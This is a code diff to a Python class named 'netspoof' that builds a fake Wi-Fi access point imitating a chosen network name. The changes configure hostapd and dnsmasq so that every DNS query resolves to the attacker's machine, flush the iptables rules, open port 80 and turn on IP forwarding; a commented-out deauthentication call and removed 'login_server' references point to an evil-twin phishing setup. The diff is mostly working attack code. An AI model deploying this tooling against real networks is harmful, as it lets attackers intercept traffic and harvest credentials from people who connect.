@@ -1,5 +1,4 @@
-#from login_server import login_server
-from threading import Thread
+
 import os
 import logging
 import time
@@ -35,13 +34,19 @@ class netspoof():
                 #self.deauthnet(var["-i"], var["-s"])
                 self.createAP(var["-s"], var["-i"], var["-c"])
 
-            except Exception, e:
-                return "Cannot spoof the network " + "'" + var["-s"] + "'" and e
+            except Exception:
+                error = []
+                error.append("1")
+                error.append("Cannot spoof the network " + "'" + var["-s"] + "'")
+                return error
         else:
-            return "Error: Need to specifiy network to spoof" and e
+            error = []
+            error.append("1")
+            error.append("Error: Need to specifiy network to spoof")
+            return error
 
     def createAP(self, ssid, iface, channel):
-
+        os.system("sudo ifconfig " + iface + " 10.0.0.1 netmask 255.255.255.0")
         # editing config file for ap settings
         ap_confile = open("hostapd.conf", "w")
         config = (
@@ -61,28 +66,19 @@ class netspoof():
 
         dhcp_confile = open("/etc/dnsmasq.conf", "a")
         config = (
-            #"address=/#/127.0.0.1\n"
-            #"listen-address=10.0.0.1\n"
             "interface=" + iface + "\n"
-            "dhcp-range=10.0.0.10,10.0.0.250,12h\n"
-            "no-resolv\n"
+            "address=/#/10.0.0.1\n"
+            "dhcp-range=10.0.0.2,10.0.0.250,12h\n"
+            "no-hosts\n"
+
         )
         dhcp_confile.write(config)
         dhcp_confile.close()
+        os.system("sudo iptables -F")
+        os.system("iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT")
+        os.system("sysctl -w net.ipv4.conf.all.route_localnet=1")
+        os.system("echo '1' > /proc/sys/net/ipv4/ip_forward")
 
-        inter_default = open("/etc/network/interfaces", "a")
-        config = (
-            "auto " + iface + "\n"
-            "\niface " + iface + " inet static\n"
-            "address 10.0.0.1\n"
-            "netmask 255.255.255.0\n"
-            "broadcast 255.0.0.0\n"
-        )
-
-        # restart network settings
-
-        inter_default.write(config)
-        inter_default.close()
         
         try:
             # start start AP and dhcp
@@ -138,17 +134,6 @@ class netspoof():
         w.writelines([item for item in lines[:-3]])
 
         w.close()
-        readFile = open("/etc/network/interfaces")
-
-        lines = readFile.readlines()
-
-        readFile.close()
-        w = open("/etc/network/interfaces",'w')
-        w.writelines([item for item in lines[:-5]])
-        w.close()
-
-    def start_server(self):
-        from login_server import login_server
 
     def checklibs():
         return
